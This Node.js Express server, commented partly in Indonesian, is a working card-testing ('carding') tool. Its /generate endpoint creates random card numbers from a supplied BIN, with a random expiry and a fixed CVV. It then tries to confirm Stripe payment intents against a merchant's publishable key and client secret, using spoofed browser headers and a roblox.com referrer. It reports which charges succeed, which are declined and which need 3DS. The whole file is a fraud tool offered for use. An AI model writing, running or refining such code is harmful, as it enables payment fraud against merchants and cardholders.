const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");

const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Fungsi untuk menghasilkan kartu kredit secara acak
function generateCreditCard(bin) {
  const randomNum = () => Math.floor(Math.random() * 10);
  const cc = bin + Array.from({ length: 16 - bin.length }, randomNum).join("");
  return cc;
}

// Fungsi utama untuk proses pembayaran
async function pistuff(cc, mes, ano, cvv, pk, pics) {
  // Set headers
  const headers = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    Pragma: "no-cache",
    Accept: "*/*",
  };

  const start_time = Date.now();

  try {
    // Send initial request to get the MUID, SID, and GUID
    const response = await axios.post(
      "https://m.stripe.com/6",
      {},
      { headers }
    );
    const jsonData = response.data;
    const m = jsonData.muid;
    const s = jsonData.sid;
    const g = jsonData.guid;

    // Extract the pi (picture ID) from pics string
    const index = pics.indexOf("_secret_");
    if (index !== -1) {
      var pi = pics.substring(0, index);
    } else {
      return { success: false, message: "Secret key not found in response." };
    }

    // Prepare the payment data
    const data = new URLSearchParams();
    data.append("payment_method_data[type]", "card");
    data.append(
      "payment_method_data[billing_details][name]",
      "skibidi+sigma+csub"
    );
    data.append("payment_method_data[card][number]", cc);
    data.append("payment_method_data[card][exp_month]", mes);
    data.append("payment_method_data[card][exp_year]", ano);
    data.append("payment_method_data[guid]", g);
    data.append("payment_method_data[muid]", m);
    data.append("payment_method_data[sid]", s);
    data.append("payment_method_data[pasted_fields]", "number");
    data.append("payment_method_data[referrer]", "https%3A%2F%2Froblox.com");
    data.append("expected_payment_method_type", "card");
    data.append("use_stripe_sdk", "true");
    data.append("key", pk);
    data.append("client_secret", pics);

    // Send second request to confirm payment intent
    const confirmResponse = await axios.post(
      `https://api.stripe.com/v1/payment_intents/${pi}/confirm`,
      data,
      { headers }
    );

    const end_time = Date.now();
    const exec_time = end_time - start_time;

    // Handle different responses based on status and errors
    if (confirmResponse.data.error && confirmResponse.data.error.code) {
      const error = confirmResponse.data.error;
      const code = error.code;
      const declineCode = error.decline_code;
      const message = error.message;

      // Handle unexpected errors
      if (code === "unexpected_error") {
        return {
          success: false,
          message: `Unexpected error occurred: ${message}`,
          code,
          declineCode,
          exec_time,
        };
      }

      return {
        success: false,
        message: `Declined: ${message}`,
        code,
        declineCode,
        exec_time,
      };
    }

    if (
      confirmResponse.data.status === "succeeded" ||
      confirmResponse.data.status === "requires_capture"
    ) {
      return {
        success: true,
        message: "Payment successful",
        amount: confirmResponse.data.amount / 100,
        currency: confirmResponse.data.currency.toUpperCase(),
        exec_time,
      };
    } else if (
      confirmResponse.data.error &&
      (confirmResponse.data.error.code === "requires_source_action" ||
        confirmResponse.data.error.code === "intent_confirmation_challenge" ||
        confirmResponse.data.error.code === "requires_action")
    ) {
      return {
        success: false,
        message: "3DS CARD action required",
        exec_time,
      };
    }

    return {
      success: false,
      message: "Payment failed with unknown status",
      exec_time,
    };
  } catch (error) {
    console.error("Error in pistuff function:", error);
    return {
      success: false,
      message: "An error occurred during the request.",
    };
  }
}

// POST endpoint for generating card and processing payment
app.post("/generate", async (req, res) => {
  const { bin, pk, pics } = req.body;

  // Validate input
  if (!bin || !pk || !pics) {
    return res.status(400).json({
      success: false,
      message: "Please provide BIN, PK, and Pics values.",
    });
  }

  try {
    // Generate a random credit card number
    const cc = generateCreditCard(bin);
    const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, "0");
    const ano = Math.floor(Math.random() * (2039 - 2024 + 1)) + 2024;
    const cvv = "000";

    console.log(`TRY CC: ${cc}|${mes}|${ano}|${cvv}`);

    // Call pistuff to process payment
    const result = await pistuff(cc, mes, ano, cvv, pk, pics);

    if (result.success) {
      return res.status(200).json({
        success: true,
        message: result.message,
        amount: result.amount,
        currency: result.currency,
        exec_time: result.exec_time,
      });
    } else {
      return res.status(400).json({
        success: false,
        message: result.message,
        code: result.code,
        declineCode: result.declineCode,
        exec_time: result.exec_time,
      });
    }
  } catch (error) {
    console.error("Error generating card:", error);
    return res.status(500).json({
      success: false,
      message: "An internal error occurred.",
    });
  }
});

// Start the Express server
app.listen(port, () => {
  console.log(`API server running on port ${port}`);
});
